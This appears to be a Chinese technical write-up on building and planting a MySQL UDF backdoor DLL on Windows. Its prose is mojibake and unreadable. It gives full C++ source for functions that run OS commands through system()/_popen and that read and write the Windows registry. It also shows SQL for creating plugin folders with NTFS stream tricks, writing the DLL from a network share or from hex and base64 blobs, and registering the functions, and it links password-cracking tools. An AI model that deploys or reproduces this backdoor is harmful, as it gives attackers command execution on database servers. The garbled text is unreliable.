# Mysql UDF backdoor ��Ŀ

## 1��MySQL_UDF��ʲô

UDF��Mysql�ṩ���û�ʵ���Լ����ܵ�һ���ӿڣ�Ϊ��ʹUDF���������ã�����������C��C ++��д�����Ҳ���ϵͳ����֧�ֶ�̬���ء���ƪ������Ҫ����UDF���������õķ�����

  

## 2��UDF����

����ϵͳ:Windows 10

���Ի�����PHPStudy+Mysql 5.5(x64)

��������VS2015

### 2.1 ����������

- MySQLԴ���

��MySQL�������ض�Ӧ�汾��Դ�������MySQL��Ӧ�汾��Դ�����ػ�������include�ļ��к�lib�ļ��н�ѹ��C++��Ŀ·����

http://mirror.yandex.ru/mirrors/ftp.mysql.com/Downloads/MySQL-5.5/mysql-5.5.59-winx64.zip

- VS2015����-��Ŀ����

  ��MySQL��include��lib�ļ��зŵ�C++��Ŀ·���������������£�

  - include��VC++Ŀ¼->����Ŀ¼->���includeĿ¼
  - lib��VC++Ŀ¼->��Ŀ¼->���libĿ¼
  - libmysql.lib��������->����������->���libmysql.lib


### 2.2 ���Է���

UDF�ڳ�������м������OutputDebugStringA();�Ϳ���������Ե���Ϣ�ˡ���ÿ����֧��������Ӧ�ĵ�����Ϣ���Ϳ��Ի�ȡ��ǰ���е�״̬��

```
OutputDebugStringA("--UDF:my_name()������");
```

### 2.3 ʹ��UDF��չ

```
// ע�ắ��
CREATE FUNCTION about RETURNS string SONAME "mysql_udf_c++.dll";
// ж�غ���
Drop function about;
// ʹ�ú���
select about();
// ��֤
select * from mysql.func where name = 'cmdshell';
```

### 2.4 CPPԴ��˼·

- ִ��CMDSHELL
ʹ�÷�ʽ��

```
# ����cmdshell����
CREATE FUNCTION cmdshell RETURNS int SONAME "mysql_udf_c++.dll";
# ִ��shell�������������·��Ĭ��·����mysql��dataĿ¼�¡����磺"D:\phpStudy\MySQL\data\helllo.txt"
select cmdshell("echo hello>>helllo.txt");
# ע��cmshell�������
Drop function cmdshell;
```

CPPԴ�����£�

```
#include <winsock.h>
#include <mysql.h>  
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>


//--------cmdshell
extern "C" __declspec(dllexport)my_bool cmdshell_init(UDF_INIT *initid, 
	UDF_ARGS *args, 
	char *message)
{   //�������� 
	unsigned int i = 0;
	if (args->arg_count == 1
		&& args->arg_type[i] == STRING_RESULT) {
		// ��������
		return 0;
	}
	else {
		strcpy(
			message
			, "Expected exactly one string type parameter"
			);
		//ִ��ʧ��	
		return 1;
	}
}
extern "C" __declspec(dllexport)my_ulonglong cmdshell(UDF_INIT *initid,
	UDF_ARGS *args, 
	char *result, 
	char *error)
{
    // ����sysytem����ִ������
	// ִ�С�net user >> hello.txt�����ʵ��·��ΪD:\phpStudy\MySQL\data\hello.txt
	// ִ���������磺select cmdshell("1");�ͻᵼ��MySQL��������
	return system(args->args[0]);

}
extern "C" __declspec(dllexport)void cmdshell_deinit(
	UDF_INIT *initid)
{

	if (initid->ptr)
	{
		free(initid->ptr);
	}
}
```
- ����shell

����shell��д���ԣ���û�л��Ե�shellִ��������һ����ԭ���
����ԭ���Ǵ���һ���ܵ���������������ܵ���ȡ������رչܵ���

ʹ�÷�ʽ��

```
# ����sys_eval����
CREATE FUNCTION sys_eval RETURNS string SONAME "mysql_udf_c++.dll";
# ִ��shell�������������·��Ĭ��·����mysql��dataĿ¼�¡����磺"D:\phpStudy\MySQL\data\helllo.txt"
select sys_eval("echo hello>>helllo.txt");
# ע��cmshell�������
Drop function sys_eval;
```

CPPԴ�����£�
```
#include <winsock.h>
#include <mysql.h>  


#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>


//--------
extern "C" __declspec(dllexport)my_bool sys_eval_init(UDF_INIT *initid, 
	UDF_ARGS *args, 
	char *message)
{   //��������
	unsigned int i = 0;
	if (args->arg_count == 1
		&& args->arg_type[i] == STRING_RESULT) {
		return 0;
	}
	else {
		strcpy(
			message
			, "Expected exactly one string type parameter"
			);
		return 1;
	}
}
extern "C" __declspec(dllexport)char*  sys_eval(UDF_INIT *initid
	, UDF_ARGS *args
	, char* result
	, unsigned long* length
	, char *is_null
	, char *error)
{
	FILE *pipe;
	char buff[1024];
	unsigned long outlen, linelen;

    // �����ڴ�
	result = (char*)malloc(sizeof(char));
	outlen = 0;
    // �����ܵ�
	pipe = _popen(args->args[0], "r");
    // ��ȡ�ܵ�����
	while (fgets(buff, sizeof(buff), pipe) != NULL) {
		linelen = strlen(buff);
		result = (char*)realloc(result, outlen + linelen);
		// �ѹܵ����ݿ��������ؽ����
		strncpy(result + outlen, buff, linelen);
		outlen = outlen + linelen;
	}
    // �رչܵ�
	_pclose(pipe);
	
    // ��*is_null������Ϊ1ʱ������ֵΪNULL
	if (!(*result) || result == NULL) {
		*is_null = 1;
	}
	else {
		result[outlen] = 0x00;
		*length = strlen(result);
	}
    // ���ؽ��
	return result;

}
extern "C" __declspec(dllexport)void sys_eval_deinit(
	UDF_INIT *initid)
{

	if (initid->ptr)
	{
		free(initid->ptr);
	}
}
```

- ע������

���Ĵ�����Ҫ�����¼���ע��������ص�APIʵ�ֵ�
```
RegQueryInfoKey
RegEnumValue
RegQueryValueEx
RegCloseKey
RegCreateKeyEx
RegSetValueEx
RegCloseKey
```

- - ע����ȡ

ʹ�÷�ʽ��

```
# ����regread����
CREATE FUNCTION regread RETURNS string SONAME "mysql_udf_c++.dll";
# ִ��regread����
select regread("HKEY_CURRENT_USER","Software\\Microsoft\\Internet Explorer\\Main","Start Page");
# ע��regread�������
Drop function regread;
```

CPPԴ�����£�

```
#include <winsock.h>
#include <mysql.h>  

#include <stdio.h>
#include <windows.h> 


#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

//--------
extern "C" __declspec(dllexport)my_bool regread_init(UDF_INIT *initid,
	UDF_ARGS *args,
	char *message)
{  

	//�жϲ����Ƿ���ȷ,���������������ַ���
	if (args->arg_type[0] == STRING_RESULT &&  // ����
		args->arg_type[1] == STRING_RESULT &&  // ����
		args->arg_type[2] == STRING_RESULT     // ��ֵ
		)
	{
		return 0;
	}
	else {
		strcpy(
			message
			, "Expected exactly Three string type parameter"
			);
		return 1;
	}
}
extern "C" __declspec(dllexport)char*  regread(UDF_INIT *initid
	, UDF_ARGS *args
	, char* result
	, unsigned long* length
	, char *is_null
	, char *error)
{
	HKEY hRoot;
	// �жϸ���
	if (strcmp("HKEY_LOCAL_MACHINE", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_LOCAL_MACHINE;
	else if (strcmp("HKEY_CLASSES_ROOT", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_CLASSES_ROOT;
	else if (strcmp("HKEY_CURRENT_USER", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_CURRENT_USER;
	else if (strcmp("HKEY_USERS", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_USERS;
	else
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[0]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[0]);
		*length = strlen(initid->ptr);
		return initid->ptr;
	}
	

	// �жϸ����治����
	// ����ת�� charתwchar
	int len = MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), NULL, 0);
	wchar_t*    m_wchar = new wchar_t[len + 1];
	MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), m_wchar, len);
	m_wchar[len] = '\0';
	HKEY aTestKey = NULL;
	DWORD dwType = REG_SZ;
	if (RegOpenKeyEx(hRoot,
		m_wchar,
		0,
		KEY_READ,
		&aTestKey) != ERROR_SUCCESS
		)
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[1]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[1]);
		*length = strlen(initid->ptr);
		return initid->ptr;
	}	



	// ��ѯ����Ŀ
	TCHAR    achClass[MAX_PATH] = TEXT("");  // ָ��һ���ִ�������װ�����ע���������� 
	DWORD    cchClassName = MAX_PATH;        // ָ��һ������������װ��lpClass�������ĳ��ȡ�һ�����أ�������Ϊʵ��װ�ص����������ֽ����� 
	DWORD    cSubKeys = 0;                   // �Ӽ�����Ŀ 
	DWORD    cbMaxSubKey;                    // ��������Ӽ����� 
	DWORD    cchMaxClass;                    // ָ��һ������������װ�������֮������һ�������ĳ��� 
	DWORD    cValues;                        // ����װ������������ֵ������һ������
	DWORD    cchMaxValue;                    // value�������
	DWORD    cbMaxValueData;                 // value�������
	DWORD    cbSecurityDescriptor;           // ��ȫ�������Ĵ�С 
	FILETIME ftLastWriteTime;                // �ϴ�д���ʱ�� 

	DWORD i, retCode;
	DWORD dwSize;
	TCHAR *wStr = new TCHAR[MAX_VALUE_NAME];
	TCHAR  achValue[MAX_VALUE_NAME];
	TCHAR  data[MAX_VALUE_NAME];
	DWORD cchValue = MAX_VALUE_NAME;
	DWORD dBufSize;   //���ؽ������

	// Get the class name and the value count. 
	retCode = RegQueryInfoKey(
		aTestKey,                // ������� 
		achClass,                // ָ��һ���ִ�������װ�����ע����������
		&cchClassName,           // ָ��һ������������װ��lpClass�������ĳ��ȡ�һ�����أ�������Ϊʵ��װ�ص����������ֽ�����
		NULL,                    // reserved 
		&cSubKeys,               // ����װ�أ����棩����������������һ������
		&cbMaxSubKey,            // ָ��һ������������װ��������һ������ĳ��ȡ�ע��������Ȳ���������ֹ�ַ�
		&cchMaxClass,            // ָ��һ������������װ�������֮������һ�������ĳ���
		&cValues,                // ����װ������������ֵ������һ������
		&cchMaxValue,            // ָ��һ������������װ�������֮������һ��ֵ���ĳ���
		&cbMaxValueData,         // ָ��һ������������װ������������һ��ֵ��������Ļ���������
		&cbSecurityDescriptor,   // װ��ֵ��ȫ���������ȵ�һ������ 
		&ftLastWriteTime);       // ָ��һ���ṹ���������ɸ������һ���޸�ʱ�� 
	
	// ö�ټ�ֵ. 
	// ƥ�����Ӧ��ֵ
	if (cValues)
	{
		for (i = 0, retCode = ERROR_SUCCESS; i < cValues; i++)
		{
			cchValue = MAX_VALUE_NAME;
			dwSize = MAX_VALUE_NAME;
			achValue[0] = '\0';
			data[0] = '\0';
			retCode = RegEnumValue(aTestKey, i,
				wStr,
				&cchValue,
				NULL,
				NULL,
				NULL,
				NULL);
			RegQueryValueEx(aTestKey, wStr,
				NULL,
				&dwType,
				(LPBYTE)data,
				&dwSize);

			
			// ����ת�� charתwchar
			int len = MultiByteToWideChar(CP_ACP, 0, (char*)(args->args)[2], strlen((char*)(args->args)[2]), NULL, 0);
			wchar_t*    m_wchar = new wchar_t[len + 1];
			MultiByteToWideChar(CP_ACP, 0, (char*)(args->args)[2], strlen((char*)(args->args)[2]), m_wchar, len);
			m_wchar[len] = '\0';


			if (retCode == ERROR_SUCCESS && wcscmp(wStr, m_wchar) == 0)
			{
				//printf("\n������%ls\n��ֵ��%ls", wStr, data);
				
				//��ȡת�������Ŀ�껺���С
				dBufSize = WideCharToMultiByte(CP_OEMCP, 0, data, -1, NULL, 0, NULL, FALSE);
				 
				//����Ŀ�껺��
				result = new char[dBufSize];
				memset(result, 0, dBufSize);
				//ת��
				int nRet = WideCharToMultiByte(CP_OEMCP, 0, data, -1, result, dBufSize, NULL, FALSE);
				
			}
		}
	}
	delete[]wStr;
	RegCloseKey(aTestKey);



	// ��*is_null������Ϊ1ʱ������ֵΪNULL
	if (!(*result) || result == NULL) {
		*is_null = 1;
	}
	else {
		result[dBufSize] = 0x00;
		*length = strlen(result);
	}
	// ���ؽ��
	return result;
}
extern "C" __declspec(dllexport)void regread_deinit(
	UDF_INIT *initid)
{

	if (initid->ptr)
	{
		free(initid->ptr);
	}
}
```
- - ע���д��
ʹ�÷�ʽ��

```
# ����regread����
CREATE FUNCTION regwrite RETURNS string SONAME "mysql_udf_c++.dll";
# ִ��regread����
select regwrite("HKEY_CURRENT_USER","Software\\Microsoft\\Internet Explorer\\Main","test","www.baidu.com");
# ע��regread�������
Drop function regwrite;
```

CPPԴ�����£�

```
#include <winsock.h>
#include <mysql.h>  

#include <stdio.h>
#include <windows.h> 

//--------
extern "C" __declspec(dllexport)my_bool regwrite_init(UDF_INIT *initid,
	UDF_ARGS *args,
	char *message)
{  

	//�жϲ����Ƿ���ȷ,���������������ַ���
	if (args->arg_type[0] == STRING_RESULT &&  // ����
		args->arg_type[1] == STRING_RESULT &&  // ����
		args->arg_type[2] == STRING_RESULT &&  // ��
		args->arg_type[3] == STRING_RESULT     // д���ֵ
		)
	{
		return 0;
	}
	else {
		strcpy(
			message
			, "Expected exactly four string type parameter"
			);
		return 1;
	}
}
extern "C" __declspec(dllexport)char*  regwrite(UDF_INIT *initid
	, UDF_ARGS *args
	, char* result
	, unsigned long* length
	, char *is_null
	, char *error)
{


	
	HKEY hRoot;
	// �жϸ���
	if (strcmp("HKEY_LOCAL_MACHINE", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_LOCAL_MACHINE;
	else if (strcmp("HKEY_CLASSES_ROOT", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_CLASSES_ROOT;
	else if (strcmp("HKEY_CURRENT_USER", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_CURRENT_USER;
	else if (strcmp("HKEY_USERS", (char*)(args->args)[0]) == 0)
		hRoot = HKEY_USERS;
	else
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[0]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[0]);
		*length = (unsigned long)strlen(initid->ptr);
		return initid->ptr;
	}

	HKEY hKey;
	DWORD dwType = REG_SZ;
	// ��ע�������������򴴽���

	// �жϸ����治����
	// szSubKey����ת�� charתwchar
	int szSubKey_len = (int)MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), NULL, 0);
	wchar_t*    szSubKey = new wchar_t[szSubKey_len + 1];
	MultiByteToWideChar(CP_ACP, 0, (args->args)[1], strlen((args->args)[1]), szSubKey, szSubKey_len);
	szSubKey[szSubKey_len] = '\0';

	size_t lRet = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet != ERROR_SUCCESS)
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[1]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[1]);
		*length = (unsigned long)strlen(initid->ptr);
		return initid->ptr;
	}

	// �޸�ע����ֵ��û���򴴽���
	// ValueName�޸ĵļ���ת�� charתwchar
	int ValueName_len = MultiByteToWideChar(CP_ACP, 0, (args->args)[2], strlen((args->args)[2]), NULL, 0);
	wchar_t*   ValueName = new wchar_t[ValueName_len + 1];
	MultiByteToWideChar(CP_ACP, 0, (args->args)[2], strlen((args->args)[2]), ValueName, ValueName_len);
	ValueName[ValueName_len] = '\0';

	//// ע����ֵ����ת�� charתwchar
	int data_len = MultiByteToWideChar(CP_ACP, 0, (args->args)[3], strlen((args->args)[3]), NULL, 0);
	wchar_t*  data = new wchar_t[data_len + 1];
	MultiByteToWideChar(CP_ACP, 0, (args->args)[3], strlen((args->args)[3]), data, data_len);
	data[data_len] = '\0';
	// ������ֽڵĳ���
	DWORD iLen = (DWORD)wcslen(data);

	//ע����ֵ�޸�
	lRet = RegSetValueEx(hKey, ValueName, 0, dwType, (unsigned char*)data, sizeof(wchar_t)*data_len);
	if (lRet != ERROR_SUCCESS)
	{
		initid->ptr = (char *)malloc(50 + strlen((args->args)[2]));
		sprintf(initid->ptr, "unknow:%s\r\n", (args->args)[2]);
		*length = (unsigned long)strlen(initid->ptr);
		return initid->ptr;
	}
	RegCloseKey(hKey);


	// ��*is_null������Ϊ1ʱ������ֵΪNULL
	if (!(*result) || result == NULL) {
		*is_null = 1;

	}
	else {
		sprintf(result, "success");
		result[iLen] = 0x00;
		*length = strlen(result);
	}
	// ���ؽ��
	return result;
}
extern "C" __declspec(dllexport)void regwrite_deinit(
	UDF_INIT *initid)
{

	if (initid->ptr)
	{
		free(initid->ptr);
	}
}
```


## 3��UDF���ط���

UDF�����ּ��ط�ʽ��һ�����޸��޸�MySQL�����ļ����ڶ������ǽ�UDF������MySQLָ���Ĳ��Ŀ¼�м��ء�

### 3.1 �޸�MySQL�����ļ�

��һ�ַ������ò��Ŀ¼��дһ���µ�MySQL�����ļ������䴫�ݸ�mysqld�� 

- �����������
```
// ͨ��mysqld����plugin��Ŀ¼λ��
mysqld.exe �Cplugin-dir=C:\\temp\\plugins\\
// ��дһ���µ�mysql�����ļ�����ͨ���Cdefaults-file�������䴫�ݸ�mysqld
mysqld.exe --defaults-file=C:\temp\my.ini
```

- my.ini����
```
[mysqld]
plugin_dir = C:\\temp\\plugins\\
```

### 3.2 �½����Ŀ¼

```
show variables like 'plugin_dir';   # �鿴·��

select 'xxx' into dumpfile 'D:\phpStudy\MySQL\lib::$INDEX_ALLOCATION';          # �½�Ŀ¼lib

select 'xxx' into dumpfile 'D:\phpStudy\MySQL\lib\plugin::$INDEX_ALLOCATION';  # �½�Ŀ¼plugin
```

### 3.3 ����UDF�ļ�����չĿ¼

- load_file����

- - load_file����֧������·���������DLL���Ƶ����繲���У������ֱ�Ӽ�������д����̡� 

```
select load_file('\\\\192.168.0.19\\share\\udf.dll') into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";
```

- ��һ��ʮ�����Ʊ�����ַ���������DLL�ļ�д����̡�

```
// ת��Ϊhex����
select hex(load_file('D:\\udf.dll')) into dumpfile "D:\\udf.hex";
// ����
select 0x4d5a...... into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll";
```

- ����һ����������������ݲ��뵽ʮ�����Ʊ������У����еĶ�����������update��������ӡ�

```
create table temp(data longblob); 
insert into temp(data) values (0x4d5a9....); 
update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000); select data from temp into dump file "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll"; 
```

- ֱ���ڴ����Ͻ��ļ������繲����ص������ַ��������ı��У�ʹ�á�load data infile������ڱ��ؼ��ء�����ͼ��ʾ���ļ�ת��Ϊʮ�����ƣ�����д�����ʱȡ���༭�� 

```
load data infile '\\\\192.168.0.19\\share\\udf.hex' into table temp fields terminated by '@OsandaMalith' lines terminated by '@OsandaMalith' (data); 
select unhex(data) from temp into dumpfile 'D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll'; 
```

- ʹ��MySQL 5.6.1��MariaDB 10.0.5�н��ܵĺ�����to_base64���͡�from_base64���ϴ��������ļ��� 

```
# ת��Ϊbase64
select to_base64(load_file('D:\\udf.dll'));

# base64����ΪDLL
select from_base64("Base64����") into dumpfile "D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll"��
```


## 4��Mysql������

### 4.1 �����ƽ����

- ���ߣ�hydra 

- CPP

������ʵ�ֵ�MYSQL��MSSQL��oracle���뱩��C����

http://blog.51cto.com/foxhack/35604

- Python

https://github.com/chinasun021/pwd_crack/blob/master/mysql/mysql_crack.py

https://www.waitalone.cn/python-mysql-mult.html

- Go

https://github.com/netxfly/x-crack

### 4.2 MySQL������ܽ���

## 5��WEB�������

### 5.1 ���ŷ���

����Mof

### 5.2 WEB��͸������չ

php̽�롢PHPMyadmin

## 6��ȡ֤����

```
// �鿴ϵͳ��Ϣ
select @@version_compile_os,@@version_compile_machine,@@plugin_dir;

// �鿴���صĺ���
select * from mysql.func;
```

## 7���ο�


Mysql������չ֮UDF����

https://blog.csdn.net/albertsh/article/details/78567661

VS2015����C/C++-MySQL��������

https://blog.csdn.net/daso_csdn/article/details/54646859

MySQL UDF���Զ��庯����

https://www.cnblogs.com/raker/p/4377343.html

MySQL UDF�ĵ��Է�ʽ - debugview
https://blog.csdn.net/swotcoder/article/details/18527

�������MySQL UDFִ������ 

http://www.360doc.cn/article/31784658_733287732.html

����MySQL UDF���е�һ����͸����
https://m.sohu.com/a/224950139_354899/?pvid=000115_3w_a

24.4.2.2 UDF Calling Sequences for Aggregate Functions

https://dev.mysql.com/doc/refman/5.5/en/udf-aggr-calling.html

windows�±�дmysql UDF������ʧ�ܾ�������ubuntu�µĳɹ����뾭��

https://blog.csdn.net/watch_ch/article/details/54015948

��Դ��Ŀ

https://github.com/mysqludf/lib_mysqludf_sys


## 8��Ч��

![test](https://images2018.cnblogs.com/blog/549050/201805/549050-20180530203927755-1403761145.png)

